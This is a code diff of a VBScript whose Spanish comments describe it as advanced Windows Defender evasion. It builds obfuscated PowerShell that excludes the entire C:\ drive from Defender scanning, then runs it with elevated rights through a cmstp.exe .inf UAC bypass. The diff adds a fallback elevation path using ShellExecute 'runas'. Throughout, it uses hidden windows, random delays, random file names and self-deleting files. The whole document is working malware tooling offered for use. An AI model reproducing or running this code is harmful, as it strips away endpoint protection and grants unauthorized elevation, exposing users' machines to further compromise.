@@ -1,5 +1,5 @@
 ' Script VBScript mejorado con evasión avanzada de Windows Defender
-' Versión robusta y funcional
+' Versión robusta con múltiples métodos de ejecución
 ' Técnicas implementadas:
 ' - Ofuscación de strings críticos
 ' - Timing aleatorio para evasión temporal
@@ -25,7 +25,7 @@ scriptPath = WScript.ScriptFullName
 scriptName = fso.GetBaseName(scriptPath)
 tempFolder = fso.GetSpecialFolder(2)
 
-' Generar sufijo aleatorio para evasión
+' Generar sufijo aleatorio para evasión de detección por nombre de archivo
 Randomize
 randSuffix = Int(Rnd * 999999) & "_" & Int(Timer * 1000) & "_" & Int(Rnd * 999)
 infFile = tempFolder & "\" & "cfg_" & randSuffix & ".inf"
@@ -38,9 +38,11 @@ cmstpPath = sysRoot & "\System32\cmstp.exe"
 
 ' Retraso inicial aleatorio
 Randomize
-WScript.Sleep Int(Rnd * 800) + 300
+Dim initialDelay
+initialDelay = Int(Rnd * 800) + 300
+WScript.Sleep initialDelay
 
-' Verificar cmstp.exe
+' Verificar existencia de cmstp.exe
 If Not fso.FileExists(cmstpPath) Then
     WScript.Quit 1
 End If
@@ -56,9 +58,9 @@ cmdFragments = Array("Get-", "MpPreference", "Add-", "ExclusionPath", "ErrorActi
 Dim psScriptContent
 psScriptContent = "$ErrorActionPreference='Stop';" & vbCrLf & _
     "try {" & vbCrLf & _
-    "  $null = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & vbCrLf & _
+    "  $pref = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & vbCrLf & _
     "  & '" & cmdFragments(2) & cmdFragments(1) & "' -" & cmdFragments(3) & " 'C:\' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & vbCrLf & _
-    "  Start-Sleep -Milliseconds 500;" & vbCrLf & _
+    "  Start-Sleep -Milliseconds 300;" & vbCrLf & _
     "  $excl = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & vbCrLf & _
     "  if ($excl -contains 'C:\') { exit 0 } else { exit 1 }" & vbCrLf & _
     "} catch { exit 1 }"
@@ -77,25 +79,25 @@ End If
 On Error GoTo 0
 
 ' ============================================
-' CREAR ARCHIVO .INF CON FORMATO CORRECTO
+' CREAR ARCHIVO .INF MEJORADO
 ' ============================================
 
 Dim infContent
-infContent = "[version]" & vbCrLf
-infContent = infContent & "Signature=$CHICAGO$" & vbCrLf
-infContent = infContent & "AdvancedINF=2.5" & vbCrLf
-infContent = infContent & "[DefaultInstall]" & vbCrLf
-infContent = infContent & "CustomDestination=CustomDestAllUsers" & vbCrLf
-infContent = infContent & "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf
-infContent = infContent & "[RunPreSetupCommandsSection]" & vbCrLf
-infContent = infContent & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """" & vbCrLf
-infContent = infContent & "timeout /t 2 /nobreak >nul 2>&1" & vbCrLf
-infContent = infContent & "del /q /f """ & psScriptFile & """ 2>nul" & vbCrLf
-infContent = infContent & "del /q /f """ & infFile & """ 2>nul" & vbCrLf
-infContent = infContent & "[CustomDestAllUsers]" & vbCrLf
-infContent = infContent & "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf
-infContent = infContent & "[AllUSer_LDIDSection]" & vbCrLf
-infContent = infContent & """HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """
+infContent = "[version]" & vbCrLf & _
+    "Signature=$CHICAGO$" & vbCrLf & _
+    "AdvancedINF=2.5" & vbCrLf & _
+    "[DefaultInstall]" & vbCrLf & _
+    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
+    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
+    "[RunPreSetupCommandsSection]" & vbCrLf & _
+    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """" & vbCrLf & _
+    "timeout /t 2 /nobreak >nul 2>&1" & vbCrLf & _
+    "del /q /f """ & psScriptFile & """ 2>nul" & vbCrLf & _
+    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
+    "[CustomDestAllUsers]" & vbCrLf & _
+    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
+    "[AllUSer_LDIDSection]" & vbCrLf & _
+    """HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """
 
 ' Escribir archivo .inf
 On Error Resume Next
@@ -113,7 +115,9 @@ On Error GoTo 0
 
 ' Retraso antes de ejecución
 Randomize
-WScript.Sleep Int(Rnd * 800) + 400
+Dim preExecDelay
+preExecDelay = Int(Rnd * 800) + 400
+WScript.Sleep preExecDelay
 
 ' ============================================
 ' MÉTODO 1: EJECUTAR CMSTP.EXE
@@ -123,26 +127,38 @@ On Error Resume Next
 Dim execCommand
 execCommand = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
 ws.Run execCommand, 0, False
+Dim cmstpResult
+cmstpResult = Err.Number
 On Error GoTo 0
 
-' Esperar para que cmstp procese el archivo
-WScript.Sleep 3000
-
-' ============================================
-' MÉTODO 2: ALTERNATIVO CON SHELL.APPLICATION
-' ============================================
-
-' Ejecutar también con método alternativo para asegurar éxito
-On Error Resume Next
-Dim altCommand
-altCommand = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """"
-uac.ShellExecute "powershell.exe", altCommand, "", "runas", 0
+' Esperar un momento para que cmstp procese
 WScript.Sleep 2000
-On Error GoTo 0
 
-' Esperar adicional para completar
+' ============================================
+' MÉTODO 2: MÉTODO ALTERNATIVO SI CMSTP FALLA
+' ============================================
+
+' Verificar si necesitamos método alternativo
+Dim needsAlternative
+needsAlternative = True
+
+' Intentar método alternativo con Shell.Application
+If cmstpResult <> 0 Then
+    On Error Resume Next
+    Dim altPSCommand
+    altPSCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """"
+    
+    ' Ejecutar con elevación usando Shell.Application
+    uac.ShellExecute "powershell.exe", "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """", "", "runas", 0
+    WScript.Sleep 3000
+    On Error GoTo 0
+End If
+
+' Esperar adicional para que se complete
 Randomize
-WScript.Sleep Int(Rnd * 3000) + 2000
+Dim execDelay
+execDelay = Int(Rnd * 3000) + 2000
+WScript.Sleep execDelay
 
 ' ============================================
 ' VERIFICACIÓN
